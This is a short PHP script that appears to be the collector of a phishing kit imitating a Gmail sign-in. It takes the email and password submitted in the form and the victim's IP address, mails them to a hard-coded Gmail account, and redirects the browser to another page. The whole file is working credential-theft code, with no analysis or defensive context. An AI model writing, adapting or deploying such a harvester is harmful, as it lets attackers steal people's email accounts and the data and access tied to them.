<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Gmail Tare_ama || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="annyoordaz@gmail.com";
$subject = "tare gmail  | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: index3.html");
?>